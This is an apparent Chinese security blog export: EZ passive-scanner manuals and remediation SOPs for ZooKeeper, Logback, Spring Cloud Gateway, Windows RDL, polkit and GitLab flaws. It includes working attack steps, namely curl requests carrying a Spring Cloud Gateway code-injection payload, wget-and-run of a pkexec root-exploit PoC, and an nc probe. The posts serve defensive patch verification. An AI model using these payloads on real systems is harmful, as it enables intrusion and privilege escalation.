{"meta":{"title":"Alice01","subtitle":"silent sorrow","description":"","author":"Alice01","url":"http://example.com","root":"/"},"pages":[{"title":"404","date":"2024-11-25T08:45:00.000Z","updated":"2024-11-25T08:45:00.000Z","comments":true,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"search","date":"2024-11-25T08:44:55.000Z","updated":"2024-11-25T08:44:55.000Z","comments":true,"path":"search/index.html","permalink":"http://example.com/search/index.html","excerpt":"","text":""}],"posts":[{"title":"EZ被动扫描-云端使用手册","slug":"EZ被动扫描-云端使用手册","date":"2025-03-28T08:15:52.000Z","updated":"2025-03-28T15:35:39.763Z","comments":true,"path":"2025/03/28/EZ被动扫描-云端使用手册/","permalink":"http://example.com/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E4%BA%91%E7%AB%AF%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录","text":"1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录 在该目录开启命令行，ez web端启动(如MAC命令为.&#x2F; ez的文件名 web) 访问http://127.0.0.1:8888 + &#x2F;bwheyansn(每次启动随机给出的路径) 初始密码为ez，首次访问需要重置密码 2.ezhelper安装与基础配置https://docs.ezreal.cool/public/ezhelper/v0.1/ez-helper.zip 下载解压，打开chrome浏览器-设置-插件-打开开发者模式 将解压的ez-helper拖进插件页面自动导入 插件管理处可将ez助手置顶在浏览器上方 3.ezhelper联动ez使用被动扫描启动服务端ez，进入ez web界面并输入修改后的密码，进入项目管理-随便添加一个项目 点击项目详情-复制项目Token 服务端保持服务，启动并使用客户端 在浏览器插件处点击ezhelper-选项配置 在Token处粘贴上项目Token EZ服务器地址:http://yourserver.ip:8888 [服务端ez地址+web端口] 白名单主机列表指定测试地址，避免未授权测试 访问测试站点 ezhelper-漏洞扫描(ezhelper颜色黑变黄表示已经开启被动扫描模式) 点击测试站点需要测试的接口ez自动测试该接口，测试结果会返回ezhelper-选项配置-漏洞管理","categories":[],"tags":[{"name":"工具SOP","slug":"工具SOP","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7SOP/"}]},{"title":"EZ被动扫描-本地使用手册","slug":"EZ被动扫描-本地使用手册","date":"2025-03-28T06:32:20.000Z","updated":"2025-03-28T15:34:41.517Z","comments":true,"path":"2025/03/28/EZ被动扫描-本地使用手册/","permalink":"http://example.com/2025/03/28/EZ%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","excerpt":"​ 1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录","text":"​ 1.ez安装与基础配置https://github.com/m-sec-org/EZ/releases/tag/1.8.9 选择操作系统对应的ez-zip文件并解压 下载ez证书 https://msec.nsfocus.com/ 登录-个人中心-申请证书-证书下载 将ez与ez证书放在同一个目录 在该目录开启命令行，ez web端启动(如MAC命令为.&#x2F; ez的文件名 web) 访问http://127.0.0.1:8888 + &#x2F;bwheyansn(每次启动随机给出的路径) 初始密码为ez，首次访问需要重置密码 2.ezhelper安装与基础配置https://docs.ezreal.cool/public/ezhelper/v0.1/ez-helper.zip 下载解压，打开chrome浏览器-设置-插件-打开开发者模式 将解压的ez-helper拖进插件页面自动导入 插件管理处可将ez助手置顶在浏览器上方 3.ezhelper联动ez使用被动扫描启动ez，进入ez web界面并输入修改后的密码，进入项目管理-随便添加一个项目 点击项目详情-复制项目Token 在浏览器插件处点击ezhelper-选项配置 在Token处粘贴上项目Token EZ服务器地址:http://127.0.0.1:8888 [ez地址+web端口] 白名单主机列表指定测试地址，避免未授权测试 访问测试站点 ezhelper-漏洞扫描(ezhelper颜色黑变黄表示已经开启被动扫描模式) 点击测试站点需要测试的接口ez自动测试该接口，测试结果会返回ezweb端-指纹&#x2F;漏洞-项目Token的项目 4.越权被动扫描越权测试前，使用两个不同账号登录并分别获取Cookie，垂直越权测试时需以权限高的账户进行测试 F12-network-该页面路径-cookies 终端ez webscan –pocs over-pass-permission –headers1 “{&quot;Cookie&quot;: &quot;账户一cookie&quot;}” –headers2 “{&quot;Cookie&quot;: &quot;账户二cookie&quot;}” 终端被动扫描监听端口后开启对应端口代理代理 点击接口即可测试越权 启动ez，进入ez web界面-指纹&#x2F;漏洞，越权扫描结果已同步 ​","categories":[],"tags":[{"name":"工具SOP","slug":"工具SOP","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7SOP/"}]},{"title":"Zookeeper未授权漏洞修复方案","slug":"Zookeeper未授权漏洞修复方案","date":"2025-03-25T07:12:44.000Z","updated":"2025-03-28T15:44:04.217Z","comments":true,"path":"2025/03/25/Zookeeper未授权漏洞修复方案/","permalink":"http://example.com/2025/03/25/Zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。 ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 1.2影响范围ZooKeeper全版本。","text":"​ 1.漏洞简介1.1漏洞描述ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。 ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 1.2影响范围ZooKeeper全版本。 2.环境搭建2.1漏洞环境搭建检查版本信息，zookeeper版本为3.4.14，属于漏洞覆盖范围内。 3.漏洞验证3.1.envi命令检测使用envi命令发送一个请求，判断是否返回了enviroment。 echo envi|nc 192.168.230.129 2181 4.漏洞修复4.1修改zoo.cfg在&#x2F;zookeeper&#x2F;config&#x2F;zoo.cfg写入一条命令白名单规则。 重启服务。 .&#x2F;zkServer.sh stop .&#x2F;zkServer.sh start 配置白名单后,未授权已无法利用。 4.2ACL配置.&#x2F;zkCli.sh查看acl 通过acl配置ip白名单为需要使用的ip。 5.漏洞复验5.1envi命令检测使用envi命令发送一个请求，判断是否返回了enviroment。 echo envi|nc 192.168.230.129 2181 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2023-6378漏洞修复方案","slug":"CVE-2023-6378漏洞修复方案","date":"2025-03-21T07:32:27.000Z","updated":"2025-03-28T15:47:51.092Z","comments":true,"path":"2025/03/21/CVE-2023-6378漏洞修复方案/","permalink":"http://example.com/2025/03/21/CVE-2023-6378%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述Logback 的接收器在处理远程日志数据时，未对反序列化输入进行严格校验，攻击者可构造恶意序列化数据通过开放的监听端口发送，导致服务崩溃或资源耗尽。 1.2影响范围1.4.x 系列：1.4.0 ≤ 版本 &lt; 1.4.12 1.3.x 系列：1.3.0 ≤ 版本 &lt; 1.3.12 1.2.x 系列：版本 &lt; 1.2.13","text":"​ 1.漏洞简介1.1漏洞描述Logback 的接收器在处理远程日志数据时，未对反序列化输入进行严格校验，攻击者可构造恶意序列化数据通过开放的监听端口发送，导致服务崩溃或资源耗尽。 1.2影响范围1.4.x 系列：1.4.0 ≤ 版本 &lt; 1.4.12 1.3.x 系列：1.3.0 ≤ 版本 &lt; 1.3.12 1.2.x 系列：版本 &lt; 1.2.13 2.环境搭建2.1漏洞环境搭建检查版本信息，logback-classic与logback-core版本为1.2.12，属于漏洞覆盖范围内。 3.漏洞验证3.1查看logback-classic和logback-core版本检查版本信息，logback-classic与logback-core版本为1.2.12，属于漏洞覆盖范围内。 View-tool windows-maven-dependencies 4.漏洞修复4.1升级logback-classic和logback-core针对logback的 CVE-2023-6378 漏洞，建议更新到如下系列对应版本：logback-classic 和 logback-core 的修补版本分别为：1.4.12、1.3.12 和 1.2.13。 修改pom.xml。 (漏洞版本) &lt;artifactId&gt;logback-classic&lt;&#x2F;artifactId&gt;&lt;version&gt;1.2.12&lt;&#x2F;version&gt; &lt;!– 漏洞版本 –&gt;&lt;artifactId&gt;logback-core&lt;&#x2F;artifactId&gt;&lt;version&gt;1.2.12&lt;&#x2F;version&gt; (安全版本) &lt;artifactId&gt;logback-classic&lt;&#x2F;artifactId&gt;&lt;version&gt;1.4.14&lt;&#x2F;version&gt;&lt;artifactId&gt;logback-core&lt;&#x2F;artifactId&gt;&lt;version&gt;1.4.14&lt;&#x2F;version&gt; Maven重构项目，下载新的依赖。 右键pom.xml-maven-sync project升级。 5.漏洞复验5.1查看logback-classic和logback-core版本检查版本是否更新成功。 View-tool windows-maven-dependencies 已成功通过pom.xml更新logback-classic和logback-cor至1.4.14版本，该版本不受此漏洞影响。 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2022-22947修复方案","slug":"CVE-2022-22947修复方案","date":"2025-03-21T03:37:12.000Z","updated":"2025-03-28T15:50:52.450Z","comments":true,"path":"2025/03/21/CVE-2022-22947修复方案/","permalink":"http://example.com/2025/03/21/CVE-2022-22947%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介1.1漏洞描述Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API ⽹关，它旨在为微服务架构提供⼀种简单有效的统⼀的 API 路由管理⽅式。当启⽤和暴露 Gateway Actuator 端点时，使⽤ Spring Cloud Gateway 的应⽤程序可受到代码注⼊攻击。 远程攻击者可以发出恶意制作的请求，从⽽远程执⾏任意代码。 1.2影响范围Spring Cloud Gateway 3.1.x &lt; 3.1.1 Spring Cloud Gateway 3.0.x &lt; 3.0.7 旧的、不受支持的版本也会受到影响。","text":"​ 1.漏洞简介1.1漏洞描述Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API ⽹关，它旨在为微服务架构提供⼀种简单有效的统⼀的 API 路由管理⽅式。当启⽤和暴露 Gateway Actuator 端点时，使⽤ Spring Cloud Gateway 的应⽤程序可受到代码注⼊攻击。 远程攻击者可以发出恶意制作的请求，从⽽远程执⾏任意代码。 1.2影响范围Spring Cloud Gateway 3.1.x &lt; 3.1.1 Spring Cloud Gateway 3.0.x &lt; 3.0.7 旧的、不受支持的版本也会受到影响。 2.环境搭建2.1漏洞环境搭建测试环境IDEA：intellij IDEA 2024.3.4 检查版本信息，spring cloud gateway版本为3.0.6，属于漏洞覆盖范围内。 3.漏洞验证3.1工具POC检测https://github.com/wh1t3zer/SpringBootVul-GUI/releases 命令whoami 有回显，判断为漏洞存在。 3.2手工POC检测用curl分别发送三个数据包 其中第一个数据包的&quot;id&quot;:&quot;whoami&quot;处whoami为执行的命令。curl -X POST http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;json” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X POST http://127.0.0.1:8080/actuator/gateway/refresh -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X GET http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” 命令whoami 有回显，判断为漏洞存在。 4.漏洞修复4.1通过pom.xml升级gateway版本升级Gateway。 3.1.x版本用户及时升级到3.1.1+ 3.0.x版本用户及时升级到3.0.7+ 修改pom.xml。 ***&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;&#x2F;artifactId&gt;&lt;version&gt;3.0.6&lt;&#x2F;version&gt; &lt;!– 易受攻击的版本 –&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;&#x2F;artifactId&gt;&lt;version&gt;3.0.7 &lt;!– 安全版本 –&gt;&lt;&#x2F;dependency&gt; Maven重构项目，下载新的依赖。 检查版本是否更新成功。 View-tool windows-maven-dependencies 已成功通过pom.xml更新gateway至3.0.7版本，该版本不受此漏洞影响。 5.漏洞复验5.1工具POC检测https://github.com/wh1t3zer/SpringBootVul-GUI/releases 版本升级后，漏洞无法利用。 5.2手工POC检测用curl分别发送三个数据包 其中第一个数据包的&quot;id&quot;:&quot;whoami&quot;处whoami为执行的命令。curl -X POST http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;json” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X POST http://127.0.0.1:8080/actuator/gateway/refresh -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” -d “{&quot;id&quot;:&quot;whoami&quot;,&quot;filters&quot;:[{&quot;name&quot;:&quot;AddResponseHeader&quot;,&quot;args&quot;:{&quot;name&quot;:&quot;Result&quot;,&quot;value&quot;:&quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot;}}],&quot;uri&quot;:&quot;http://example.com\\&quot;}“ curl -X GET http://127.0.0.1:8080/actuator/gateway/routes/hacktest -H “Host: 127.0.0.1:8080” -H “Accept-Encoding: gzip, deflate” -H “Accept: &#x2F;“ -H “Accept-Language: en” -H “User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36” -H “Connection: close” -H “Content-Type: application&#x2F;x-www-form-urlencoded” 版本升级后，漏洞无法利用。 ​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2024-38077漏洞修复方案","slug":"CVE-2024-38077漏洞修复方案","date":"2025-03-20T10:34:32.000Z","updated":"2025-03-28T15:42:48.878Z","comments":true,"path":"2025/03/20/CVE-2024-38077漏洞修复方案/","permalink":"http://example.com/2025/03/20/CVE-2024-38077%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"1.漏洞简介.1漏洞描述根据微软最新披露的远程代码执行超高危漏洞CVE-2024-38077， CVSS评分高达9.8 ，可导致开启了远程桌面许可服务的Windwos服务器完全沦陷。攻击者无需任何前置条件，无需用户交互（零点击）便可直接获取服务器最高权限，执行任意操作。漏洞影响Windows Server 2000到Windows Server 2025所有版本，这一漏洞存在于Windows远程桌面许可管理服务（RDL）中，该服务被广泛部署于开启Windows远程桌面（3389端口）的服务器，用于管理远程桌面连接许可。 .2影响范围Windows Server 2000到Windows Server 2025所有版本。","text":"1.漏洞简介.1漏洞描述根据微软最新披露的远程代码执行超高危漏洞CVE-2024-38077， CVSS评分高达9.8 ，可导致开启了远程桌面许可服务的Windwos服务器完全沦陷。攻击者无需任何前置条件，无需用户交互（零点击）便可直接获取服务器最高权限，执行任意操作。漏洞影响Windows Server 2000到Windows Server 2025所有版本，这一漏洞存在于Windows远程桌面许可管理服务（RDL）中，该服务被广泛部署于开启Windows远程桌面（3389端口）的服务器，用于管理远程桌面连接许可。 .2影响范围Windows Server 2000到Windows Server 2025所有版本。 2.环境搭建2.1漏洞环境搭建检查版本与补丁信息，属于漏洞覆盖范围内。​​​ 3.漏洞验证3.1版本补丁检测检查版本与补丁信息，属于漏洞覆盖范围内。​​​确认版本与补丁，在漏洞影响范围内。 3.2POC检测为了提升效率可以借助公开的漏洞验证程序进行验证。POC地址GitCode - 全球开发者的开源社区,开源代码托管平台GitCode是面向全球开发者的开源社区,包括原创博客,开源代码托管,代码协作,项目管理等。与开发者社区互动,提升您的研发效率和质量。https://gitcode.com/open-source-toolkit/529c6/?utm_source=tools_gitcode&amp;index=bottom&amp;type=card&amp;未开启RDL​​​不存在漏洞。开启RDL​​​​​​​​​​​​​​​​​​存在漏洞。 4.漏洞修复4.1版本升级打开微软CVE-2024-38077补丁包位置，找到对应版本如Windows server 2016的补丁包。Security Update Guide - Microsoft Security Response Centerhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077下载对应版本补丁包如Windows server 2016的KB5040434。​​​​​​​​​​​​​​​​​​命令解压安装。expand -F:* C:\\Users\\admin\\Desktop\\windows10.0-kb5040434-x64_d54a2d3165f2f751ceee94f5a92b8ae70a82b77e.msu C:\\Users\\admin\\Desktop\\​​​​​​​​​​​​​​​​以管理员身份运行cmd。dism &#x2F;online &#x2F;add-package &#x2F;packagepath:”C:\\Users\\admin\\Desktop\\Windows10.0-KB5040434-x64.cab”​​​​​​​​​​​​​​​​如果您在安装过程中遇到“错误：0x800f0823”报错，可参考以下步骤处理。 4.1报错处理方法https://www.catalog.update.microsoft.com/Search.aspx?q=servicing%20stack![](/images/CVE-2024-38077漏洞修复方案/13.png)​​双击安装。重新安装补丁包。dism &#x2F;online &#x2F;add-package &#x2F;packagepath:”C:\\Users\\admin\\Desktop\\Windows10.0-KB5040434-x64.cab”补丁包安装时间较长，安装后，根据提示重启计算机，完成更新。​​​​​​​​​​​​​​​​ 5.漏洞复验5.1版本检测​​完成更新后，检查是否存在相应的安全补丁，如补丁存在，则表示系统不受该漏洞的影响。 5.2POC检测​​编辑打补丁后POC无法利用。​","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2021-4034漏洞修复方案","slug":"CVE-2021-4034漏洞修复方案","date":"2025-03-20T10:23:05.000Z","updated":"2025-03-28T15:41:20.343Z","comments":true,"path":"2025/03/20/CVE-2021-4034漏洞修复方案/","permalink":"http://example.com/2025/03/20/CVE-2021-4034%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"1.漏洞简介1.1漏洞描述CVE-2021-4034是一个影响Linux系统的严重安全漏洞，存在于polkit的pkexec程序中。Polkit是一个在类Unix操作系统中控制系统范围权限的组件，pkexec是Polkit的一部分，允许非特权用户根据预定义的策略以特权用户身份运行命令。由于pkexec在特定情况下无法正确处理调用参数计数，攻击者可以通过控制环境变量，诱导pkexec执行任意代码，从而获得系统的root权限。 1.2影响范围Debain stretch policykit-1 &lt; 0.105-18+deb9u2Debain buster policykit-1 &lt; 0.105-25+deb10u1Debain bookworm, bullseye policykit-1 &lt; 0.105-31.1Ubuntu 21.10 (Impish Indri) policykit-1 &lt; 0.105-31ubuntu0.1Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)Ubuntu 20.04 LTS (Focal Fossa) policykit-1 &lt; 0.105-26ubuntu1.2)Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 &lt;0.105-20ubuntu0.18.04.6)Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 &lt;0.105-14.1ubuntu0.5+esm1)Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 &lt;0.105-4ubuntu3.14.04.6+esm1)CentOS 6 polkit &lt; polkit-0.96-11.el6_10.2CentOS 7 polkit &lt; polkit-0.112-26.el7_9.1CentOS 8.0 polkit &lt; polkit-0.115-13.el8_5.1CentOS 8.2 polkit &lt; polkit-0.115-11.el8_2.2CentOS 8.4 polkit &lt; polkit-0.115-11.el8_4.2","text":"1.漏洞简介1.1漏洞描述CVE-2021-4034是一个影响Linux系统的严重安全漏洞，存在于polkit的pkexec程序中。Polkit是一个在类Unix操作系统中控制系统范围权限的组件，pkexec是Polkit的一部分，允许非特权用户根据预定义的策略以特权用户身份运行命令。由于pkexec在特定情况下无法正确处理调用参数计数，攻击者可以通过控制环境变量，诱导pkexec执行任意代码，从而获得系统的root权限。 1.2影响范围Debain stretch policykit-1 &lt; 0.105-18+deb9u2Debain buster policykit-1 &lt; 0.105-25+deb10u1Debain bookworm, bullseye policykit-1 &lt; 0.105-31.1Ubuntu 21.10 (Impish Indri) policykit-1 &lt; 0.105-31ubuntu0.1Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)Ubuntu 20.04 LTS (Focal Fossa) policykit-1 &lt; 0.105-26ubuntu1.2)Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 &lt;0.105-20ubuntu0.18.04.6)Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 &lt;0.105-14.1ubuntu0.5+esm1)Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 &lt;0.105-4ubuntu3.14.04.6+esm1)CentOS 6 polkit &lt; polkit-0.96-11.el6_10.2CentOS 7 polkit &lt; polkit-0.112-26.el7_9.1CentOS 8.0 polkit &lt; polkit-0.115-13.el8_5.1CentOS 8.2 polkit &lt; polkit-0.115-11.el8_2.2CentOS 8.4 polkit &lt; polkit-0.115-11.el8_4.2 2.环境搭建2.1漏洞环境搭建检查版本信息，属于漏洞覆盖范围内 3.漏洞验证3.1版本检测dpkg -l policykit-1 3.2POC检测识别到当前为存在漏洞的版本。为了提升效率可以借助公开的漏洞验证程序进行验证wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gztar -zxvf main.tar.gzcd CVE-2021-4034-main&#x2F;make.&#x2F;cve-2021-4034提权成功，测试可以执行命令 4.漏洞修复4.1在线升级sudo apt-get updatesudo apt-get install policykit-1编辑dpkg -l policykit-1验证升级完成,已更新至安全版本 4.2离线升级https://pkgs.org/download/policykit-1下载对应版本后，离线拷贝至主机policykit-1_0.105-14.1ubuntu0.5+esm1_amd64.deb演示安装升级文件dpkg -i policykit-1_0.105-14.1ubuntu0.5+esm1_amd64.debdpkg -l policykit-1验证升级完成，已更新至安全版本 5.漏洞复验5.1版本检测dpkg -l policykit-1版本检测，不在漏洞影响范围内 5.2POC检测识别到当前为存在漏洞的版本。为了提升效率可以借助公开的漏洞验证程序进行验证wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gztar -zxvf main.tar.gzcd CVE-2021-4034-main&#x2F;make.&#x2F;cve-2021-4034在完成升级后，使用漏洞利用工具尝试，未产生任何效果，表明漏洞已成功修复。","categories":[],"tags":[{"name":"漏洞修复SOP","slug":"漏洞修复SOP","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/"}]},{"title":"CVE-2024-6678漏洞修复方案","slug":"CVE-2024-6678漏洞修复方案","date":"2025-03-20T09:24:06.000Z","updated":"2025-03-28T15:38:19.722Z","comments":true,"path":"2025/03/20/CVE-2024-6678漏洞修复方案/","permalink":"http://example.com/2025/03/20/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","excerpt":"​ 1.漏洞简介 ### 1.1漏洞描述 GitLab 是一个基于 Git 的代码仓库管理平台 攻击者可通过低权限账户或未授权访问，利用 GitLab 的访问控制机制缺陷，以其他用户身份触发 CI&#x2F;CD 管道。具体而言，漏洞涉及 GitLab 的“环境停止操作”功能权限校验不严格，允许攻击者绕过身份验证，模拟高权限用户（如项目维护者或管理员）执行环境停止操作，进而注入恶意代码或篡改流程 1.2影响范围 8.14 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.1.7 17.2 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.2.5 17.3 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.3.2","text":"​ 1.漏洞简介 ### 1.1漏洞描述 GitLab 是一个基于 Git 的代码仓库管理平台 攻击者可通过低权限账户或未授权访问，利用 GitLab 的访问控制机制缺陷，以其他用户身份触发 CI&#x2F;CD 管道。具体而言，漏洞涉及 GitLab 的“环境停止操作”功能权限校验不严格，允许攻击者绕过身份验证，模拟高权限用户（如项目维护者或管理员）执行环境停止操作，进而注入恶意代码或篡改流程 1.2影响范围 8.14 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.1.7 17.2 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.2.5 17.3 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.3.2 2.环境搭建 ### 2.1Linux下漏洞环境准备检查版本信息，GitLab版本为16.2.1-ce，属于漏洞覆盖范围内cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION 3.漏洞验证 ### 3.1版本检测 影响版本：8.14 ≤ GitLab &lt; 17.1.7、17.2 ≤ GitLab &lt; 17.2.5、17.3 ≤ GitLab &lt; 17.3.2若当前版本在受影响范围内且未升级到修复版本，则存在风险 4.漏洞修复 ### 4.1版本升级sudo apt-cache madison gitlab-ce查看所有版本注意不要直接跨大版本升级,否则报错,需要按官方升级文档按顺序依次升级apt install gitlab-ce&#x3D;xx.x.x-ce.0升级后通过命令查看版本是否提高cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION继续重复升级,升级到不被漏洞影响的版本sudo apt install gitlab-ce&#x3D;17.0.5-ce.0sudo apt install gitlab-ce&#x3D;17.3.6-ce.0升级后通过命令查看版本是否提高cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION已升级到Gitlab漏洞影响范围外版本 5.漏洞复验 ### 5.1版本检测 影响版本：8.14 ≤ GitLab &lt; 17.1.7、17.2 ≤ GitLab &lt; 17.2.5、17.3 ≤ GitLab &lt; 17.3.2若当前版本不在受影响范围内或升级到修复版本，则完成修复 